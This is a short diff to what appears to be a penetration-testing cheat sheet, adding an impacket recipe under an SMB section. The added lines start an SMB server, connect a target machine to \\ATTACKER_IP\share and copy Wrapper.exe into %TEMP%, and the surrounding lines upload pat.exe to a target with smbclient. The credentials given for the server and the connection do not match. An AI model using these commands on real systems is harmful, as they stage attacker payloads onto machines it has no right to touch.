@@ -483,6 +483,20 @@
   - put file.name
   - smbclient -c 'put pat.exe' -U USER -W ZA '//TARGET' PASSWORD
 
+- Use impacket
+```
+# create server
+sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password 1234567
+
+# Connect to the SMB server
+net use \\ATTACKER_IP\share /USER:user s3cureP@ssword 
+
+# retrieve the files on the share
+copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe
+
+# Disconnect server
+net use \\ATTACKER_IP\share /del
+```
 
 # RDP
 - Basic login
